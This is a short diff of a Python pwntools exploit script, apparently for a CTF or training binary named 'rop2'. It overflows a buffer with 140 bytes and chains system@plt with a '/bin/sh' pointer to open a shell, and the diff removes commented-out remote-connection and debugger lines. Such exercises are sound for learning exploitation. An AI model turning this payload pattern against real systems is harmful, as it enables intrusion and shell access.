@@ -7,9 +7,6 @@ ret=0
 ov=b"A"*140
 pay=ov+p32(system_plt)+p32(ret)+p32(binsh)
 p=process("./rop2")
-# p=remote("0.0.0.0",9999)
-# gdb.attach(p,'''
-# B *0x080484DA
-# ''')
+
 p.sendline(pay)
 p.interactive()
